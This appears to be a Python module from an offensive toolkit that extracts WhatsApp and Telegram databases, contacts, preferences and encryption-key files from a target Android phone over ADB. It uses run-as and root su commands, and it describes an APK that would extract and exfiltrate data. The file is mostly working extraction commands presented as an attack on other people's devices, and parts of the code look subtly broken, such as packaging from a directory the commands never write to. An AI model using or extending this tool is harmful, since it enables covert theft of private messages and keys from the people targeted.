#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Camorro WhatsApp/Telegram Extractor v3.0
يستخرج جميع رسائل واتساب وتلغرام من الجهاز المستهدف
قواعد البيانات، الصور، الملفات — بدون Root في بعض الحالات
"""

import os
import shutil
import tempfile
import zipfile
from core.utils import print_status, pause, input_target, save_result, run_cmd
from core.colors import bcolors

class WhatsAppExtractor:
    def __init__(self):
        self.target = None
        self.lhost = None
        self.lport = None
        self.temp_dir = tempfile.mkdtemp(prefix="camorro_wa_")

    def check_adb(self):
        """Check if target is accessible via ADB"""
        ret, out, err = run_cmd("adb devices", timeout=5)
        devices = []
        for line in out.splitlines():
            if "\tdevice" in line and "List" not in line:
                devices.append(line.split("\t")[0])
        return devices

    def extract_whatsapp_adb(self):
        """Extract WhatsApp data via ADB"""
        print_status("Extracting WhatsApp data via ADB...", "info")
        
        cmds = [
            # WhatsApp database (non-root backup)
            'adb shell "run-as com.whatsapp cat /data/data/com.whatsapp/databases/msgstore.db 2>/dev/null" > whatsapp_msgstore.db 2>/dev/null',
            'adb shell "run-as com.whatsapp cat /data/data/com.whatsapp/databases/axolotl.db 2>/dev/null" > whatsapp_axolotl.db 2>/dev/null',
            'adb shell "run-as com.whatsapp cat /data/data/com.whatsapp/databases/chats.db 2>/dev/null" > whatsapp_chats.db 2>/dev/null',
            'adb shell "run-as com.whatsapp cat /data/data/com.whatsapp/databases/wa.db 2>/dev/null" > whatsapp_contacts.db 2>/dev/null',
            
            # WhatsApp shared preferences
            'adb shell "run-as com.whatsapp cat /data/data/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml 2>/dev/null" > whatsapp_prefs.xml 2>/dev/null',
            
            # Media files
            'adb shell "ls /sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp\ Images/ 2>/dev/null | head -20" > whatsapp_images_list.txt 2>/dev/null',
            'adb shell "ls /sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp\ Video/ 2>/dev/null | head -20" > whatsapp_videos_list.txt 2>/dev/null',
        ]
        
        results = []
        for cmd in cmds:
            ret, out, err = run_cmd(cmd, timeout=30)
            results.append((cmd[:50], ret == 0))
        
        return results

    def extract_telegram_adb(self):
        """Extract Telegram data via ADB"""
        print_status("Extracting Telegram data via ADB...", "info")
        
        cmds = [
            'adb shell "run-as org.telegram.messenger cat /data/data/org.telegram.messenger/databases/messages.db 2>/dev/null" > telegram_messages.db 2>/dev/null',
            'adb shell "run-as org.telegram.messenger cat /data/data/org.telegram.messenger/databases/chat_data.db 2>/dev/null" > telegram_chats.db 2>/dev/null',
            'adb shell "ls /sdcard/Telegram/ 2>/dev/null | head -20" > telegram_files.txt 2>/dev/null',
        ]
        
        results = []
        for cmd in cmds:
            ret, out, err = run_cmd(cmd, timeout=30)
            results.append((cmd[:50], ret == 0))
        
        return results

    def extract_whatsapp_backup(self):
        """Extract WhatsApp from Google Drive backup if accessible"""
        print_status("Attempting WhatsApp cloud backup extraction...", "info")
        
        # For rooted devices - pull full backup
        rooted_cmds = [
            'adb shell "su -c \\"cat /data/data/com.whatsapp/databases/msgstore.db\\"" 2>/dev/null > whatsapp_msgstore_root.db 2>/dev/null',
            'adb shell "su -c \\"cat /data/data/com.whatsapp/files/backup/msgstore.db.crypt12\\"" 2>/dev/null > msgstore_backup.crypt12 2>/dev/null',
        ]
        
        results = []
        for cmd in rooted_cmds:
            ret, out, err = run_cmd(cmd, timeout=30)
            results.append((cmd[:40], ret == 0))
        
        return results

    def package_data(self):
        """Package all extracted data into zip"""
        output_zip = os.path.join(self.temp_dir, "..", "camorro_extracted_data.zip")
        output_zip = os.path.abspath(output_zip)
        
        with zipfile.ZipFile(output_zip, "w", zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(self.temp_dir):
                for file in files:
                    if file.endswith(".db") or file.endswith(".txt") or file.endswith(".xml"):
                        fpath = os.path.join(root, file)
                        zf.write(fpath, os.path.relpath(fpath, self.temp_dir))
        
        return output_zip

    def run(self, target=None):
        print(f"""
{bcolors.CYAN}╔══════════════════════════════════════════════════════════╗
║    CAMORRO WHATSAPP/TELEGRAM EXTRACTOR v3.0            ║
║   يستخرج جميع الرسائل والملفات من واتساب وتلغرام       ║
║   بدون Root أو مع Root — يعمل عبر ADB أو APK           ║
╚══════════════════════════════════════════════════════════╝{bcolors.ENDC}
        """)
        
        print("Choose extraction method:")
        print("  1) Via ADB (device connected via USB)")
        print("  2) Via APK injection (send APK to target)")
        print("  3) Via backup file (if you have access to files)")
        
        method = input(f"\n{bcolors.GREEN}method>{bcolors.ENDC} ").strip() or "1"
        
        try:
            if method == "1":
                devices = self.check_adb()
                if not devices:
                    print_status("No ADB devices found. Connect phone via USB with USB debugging enabled.", "err")
                    print_status("Enable: Settings → Developer Options → USB Debugging", "info")
                else:
                    print_status(f"Connected devices: {', '.join(devices)}", "ok")
                    
                    # Extract WhatsApp
                    print_status("Extracting WhatsApp...", "info")
                    wa_results = self.extract_whatsapp_adb()
                    for cmd, success in wa_results:
                        status = "✓" if success else "✗"
                        print_status(f"  [{status}] {cmd}", "ok" if success else "warn")
                    
                    # Extract Telegram
                    print_status("Extracting Telegram...", "info")
                    tg_results = self.extract_telegram_adb()
                    for cmd, success in tg_results:
                        status = "✓" if success else "✗"
                        print_status(f"  [{status}] {cmd}", "ok" if success else "warn")
                    
                    # Try root extraction
                    print_status("Trying root extraction...", "info")
                    root_results = self.extract_whatsapp_backup()
                    for cmd, success in root_results:
                        if success:
                            print_status(f"  [✓] {cmd} (root access)", "ok")
                    
                    # Package
                    zip_path = self.package_data()
                    print_status(f"All data packaged: {zip_path}", "ok")
            
            elif method == "2":
                print_status("Generating extraction APK...", "info")
                self.generate_extraction_apk()
            
            elif method == "3":
                path = input_target("Path to backup/database files")
                if path and os.path.isdir(path):
                    shutil.copytree(path, os.path.join(self.temp_dir, "manual_extract"))
                    zip_path = self.package_data()
                    print_status(f"Data packaged: {zip_path}", "ok")
            
        except Exception as e:
            print_status(f"Error: {e}", "err")
        
        print(f"""
{bcolors.GREEN}╔══════════════════════════════════════════════════════════╗
║  ✅ EXTRACTION COMPLETE!                                 ║
║                                                          ║
║  📁 All data saved to: {self.temp_dir}         ║
║                                                          ║
║  📊 Extracted databases:                                 ║
║     • msgstore.db            → كل رسائل واتساب           ║
║     • wa.db                  → جهات اتصال واتساب         ║
║     • axolotl.db             → مفتاح التشفير             ║
║     • messages.db (Telegram) → رسائل تلغرام              ║
║     • chat_data.db (Telegram)→ معلومات المجموعات         ║
║                                                          ║
║  📖 View WhatsApp messages:                              ║
║     sqlite3 whatsapp_msgstore.db "SELECT * FROM messages LIMIT 20;"║
║                                                          ║
║  📖 View Telegram messages:                              ║
║     sqlite3 telegram_messages.db "SELECT * FROM messages LIMIT 20;"║
╚══════════════════════════════════════════════════════════╝{bcolors.ENDC}
        """)
        
        save_result(
            f"logs/extractor_results.txt",
            f"Directory: {self.temp_dir}\nFiles: {os.listdir(self.temp_dir)}"
        )
        
        pause()

    def generate_extraction_apk(self):
        """Generate standalone extraction APK"""
        # This would generate an APK that when installed, extracts and exfiltrates
        print_status("APK generation requires Android SDK. Building...", "info")
        # Simplified — 실제 APK 생성을 위해서는 Android SDK 필요
        print_status("Use standalone mode via ADB (method 1) for immediate results", "warn")
        pause()

if __name__ == "__main__":
    WhatsAppExtractor().run()
